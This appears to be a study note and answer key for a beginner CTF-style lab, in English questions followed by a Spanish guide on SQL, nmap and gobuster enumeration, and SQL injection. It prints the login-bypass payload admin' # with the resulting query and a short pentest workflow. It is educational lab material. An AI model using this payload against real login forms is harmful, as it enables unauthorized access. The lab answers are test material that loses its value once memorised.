1. What does the acronym SQL stand for?
	Structured Query Language
2. What is one of the most common type of SQL vulnerabilities?
	SQL injection
3. What is the 2021 OWASP Top 10 classification for this vulnerability?
	A03:2021-Injection
4. What does Nmap report as the service and version that are running on port 80 of the target?
	Apache httpd 2.4.38 ((Debian))
5. What is the standard port used for the HTTPS protocol?
	443
6. What is a folder called in web-application terminology?
	directory
7. What is the HTTP response code is given for 'Not Found' errors?
	404
8. Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?
	dir
9. What single character can be used to comment out the rest of a line in MySQL?
	#
10. What single character can be used to comment out the rest of a line in MySQL?
	#
11. If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?
	Congratulations (username: admin' #)   

---

# 📚 Nota de Estudio — SQL, Web Apps & SQL Injection

---

# 🗄️ 1. ¿Qué significa SQL?

✅ **SQL = Structured Query Language**

SQL es el lenguaje usado para:

- crear bases de datos
    
- consultar información
    
- modificar datos
    
- eliminar registros
    

Usado por motores como:

- MySQL
    
- MariaDB
    
- PostgreSQL
    

---

# 💉 2. Vulnerabilidad común — SQL Injection

✅ **SQL Injection (SQLi)**

Ocurre cuando:

> La entrada del usuario se inserta directamente en consultas SQL sin validación.

Ejemplo vulnerable:

```sql
SELECT * FROM users 
WHERE username='$user'
AND password='$pass';
```

El atacante puede modificar la query.

---

# 🚨 3. Clasificación OWASP

Según el:

OWASP Top 10 (2021)

SQL Injection pertenece a:

```id="owasp"
A03:2021 - Injection
```

Una de las vulnerabilidades **más críticas**.

---

# 🌐 4. Servicio Web detectado

Nmap identifica en puerto 80:

```
Apache httpd 2.4.38 ((Debian))
```

Servidor:

Apache HTTP Server

Información obtenida mediante:

```bash
nmap -sV -p80 target
```

---

# 🔒 5. Puerto estándar HTTPS

```bash
443/tcp
```

Protocolos web:

|Puerto|Protocolo|
|---|---|
|80|HTTP|
|443|HTTPS|

HTTPS = HTTP + cifrado TLS.

---

# 📁 6. Terminología Web

En aplicaciones web:

✅ Folder = **Directory**

Ejemplo:

```
/admin/
/login/
/uploads/
```

---

# 📡 7. Código HTTP — Not Found

Error:

```bash
404
```

Significa:

> El recurso solicitado no existe.

Muy importante durante brute force.

---

# 🚪 8. Directory Brute Force

Herramienta:

Gobuster

---

## Switch para buscar directorios

```bash
dir
```

Ejemplo:

```bash
gobuster dir -u http://target -w wordlist.txt
```

(No busca subdominios).

---

# 💬 9. Comentarios en MySQL

En MySQL podemos comentar líneas usando:

```sql
#
```

o también:

```sql
-- 
```

Todo después del comentario es ignorado.

---

# 🔥 10. SQL Injection usando comentarios

Si el login usa:

```sql
SELECT * FROM users
WHERE username='USER'
AND password='PASS';
```

Podemos introducir:

```sql
admin' #
```

---

## Query resultante

```sql
SELECT * FROM users
WHERE username='admin' #
AND password='';
```

👉 El password queda comentado.

✅ Login exitoso sin contraseña.

---

# 🧠 11. Resultado del bypass

Después del login aparece la página:

```
Congratulations
```

✅ Primera palabra mostrada:

```bash
Congratulations
```

Payload usado:

```bash
admin' #
```

---

# 🔥 Flujo real de Pentesting Web

```bash
# escaneo
nmap -sC -sV target

# enumerar web
gobuster dir -u http://target -w wordlist.txt

# encontrar login
login.php

# probar SQLi
admin' #

# bypass login
access granted
```

---

# 🚨 Señales típicas de SQL Injection

✅ login falla extraño  
✅ errores SQL  
✅ comportamiento diferente con `'`  
✅ bypass sin password

---

# 🧩 Checklist rápido (HTB / Examen)

|Pregunta|Respuesta|
|---|---|
|SQL|Structured Query Language|
|Vulnerabilidad común|SQL Injection|
|OWASP categoría|A03:2021-Injection|
|Web server|Apache 2.4.38|
|HTTPS puerto|443|
|Folder web|directory|
|Not Found|404|
|Gobuster mode|dir|
|Comentario MySQL|#|
|SQLi login|admin' #|
|Primera palabra|Congratulations|
